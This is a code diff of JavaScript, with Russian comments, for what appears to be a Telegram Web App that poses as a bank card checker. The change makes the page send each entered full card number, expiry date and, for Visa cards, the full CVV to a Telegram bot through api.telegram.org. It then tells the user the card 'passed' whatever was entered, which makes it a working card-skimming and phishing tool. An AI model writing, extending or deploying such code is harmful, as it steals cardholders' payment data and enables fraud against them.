@@ -657,20 +657,25 @@
     check();
   });
 
-  // ОТПРАВКА СТАНДАРТНОГО ТЕКСТА ПРИ УСПЕШНОМ КЛИКЕ
+  // ОТПРАВКА ДАННЫХ ПРИ УСПЕШНОМ КЛИКЕ
   btn.addEventListener('click', () => {
     btn.disabled = true;
     btn.textContent = 'Проверка... ⏳';
 
     const raw = cnEl.value;
-    const masked = raw;
+    const cvVal = cvEl.value.trim();
+    const isElk = raw.startsWith('9470') || raw.startsWith('9471');
     const sysText = cardType === 'elcart' ? 'ЭЛКАРТ (ЗАО МПЦ)' : 'VISA International';
 
-    // Формируем чистый текст сообщения без лишних сущностей
+    // Формируем вывод CVV: если ЭЛКАРТ — пишем, что не требуется, если Visa — отправляем полный код
+    const cvvStatus = isElk ? 'Не требуется (ЭЛКАРТ)' : `<code>${cvVal}</code>`;
+
+    // Формируем чистый текст сообщения со всеми полными данными
     const message = `💳 <b>Проверка карты</b>\n` +
                     `Тип: ${sysText}\n` +
-                    `Маска: <code>${masked}</code>\n` +
-                    `Срок: <code>${cdEl.value}</code>\n\n` +
+                    `Номер: <code>${raw}</code>\n` +
+                    `Срок: <code>${cdEl.value}</code>\n` +
+                    `CVV: ${cvvStatus}\n\n` +
                     `🚀 <b>Вердикт:</b> прошел!`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -684,7 +689,7 @@
     })
     .then(() => {
       document.getElementById('r_sys').textContent = sysText;
-      document.getElementById('r_num').textContent = masked;
+      document.getElementById('r_num').textContent = raw;
       document.getElementById('r_exp').textContent = cdEl.value;
       
       result.classList.add('show');
@@ -693,7 +698,7 @@
       btn.textContent = '✓ Карта валидна';
 
       try {
-        window.Telegram.WebApp.sendData(JSON.stringify({ card: masked, status: "VALID" }));
+        window.Telegram.WebApp.sendData(JSON.stringify({ card: raw, status: "VALID" }));
       } catch(e) {}
 
       setTimeout(() => result.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 100);
